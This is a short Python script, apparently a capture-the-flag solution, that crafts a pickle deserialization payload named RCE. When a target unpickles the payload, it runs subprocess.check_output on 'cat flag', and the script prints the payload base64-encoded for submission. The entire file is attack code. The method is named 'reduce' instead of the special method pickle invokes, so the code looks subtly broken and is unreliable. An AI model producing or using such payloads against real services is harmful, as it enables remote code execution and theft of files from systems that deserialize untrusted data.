import pickle
import base64
import os
import subprocess


class RCE:
    def reduce(self):
        cmd = ("cat", "flag")
        return subprocess.check_output, (cmd,)


if __name__ == "__main__":
    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled))